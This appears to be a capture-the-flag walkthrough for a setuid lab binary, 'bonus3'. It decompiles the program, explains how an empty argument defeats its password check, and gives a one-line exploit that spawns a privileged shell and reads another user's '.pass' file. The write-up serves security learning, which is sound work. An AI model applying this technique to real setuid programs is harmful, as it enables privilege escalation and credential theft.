bonus3 - walkthrough
====================

Target: /home/user/bonus3/bonus3   (setuid + setgid end)
Goal:   read /home/user/end/.pass   (the FINAL flag)

1. Recon (objdump -d bonus3), main():
     fp = fopen("/home/user/end/.pass", "r");
     memset(buf, 0, 132);
     if (fp == NULL || argc != 2) return -1;
     fread(buf, 1, 0x42, fp);          ; read the secret pass into buf (a)
     buf[0x41] = 0;
     buf[atoi(argv[1])] = 0;           ; <-- arbitrary-index NUL write
     fread(buf + 0x42, 1, 0x41, fp);   ; second read: file already at EOF -> ""
     fclose(fp);
     if (strcmp(buf, argv[1]) == 0)
         execl("/bin/sh", "sh", NULL); ; strings 0x804870a / 0x8048707
     else
         puts(buf + 0x42);

2. The bug
   The program compares the secret password (buf) with OUR argv[1]. We can't
   know the password, but we control:
     - the truncation index  buf[atoi(argv[1])] = 0
     - the string it is compared against (argv[1] itself)

   Pick argv[1] = "" (the empty string):
     atoi("")      == 0     -> buf[0] = 0   -> buf becomes ""
     strcmp("", "") == 0                    -> the check passes
   The second fread returns 0 (the whole file was consumed by the first fread),
   so nothing else matters. execl("/bin/sh","sh",NULL) then runs a shell as the
   `end` user.

3. Exploit
     $ echo 'cat /home/user/end/.pass' | ./bonus3 ''
   The spawned shell reads stdin (the freads were from the file, not stdin), so
   the piped command runs and prints the final flag.

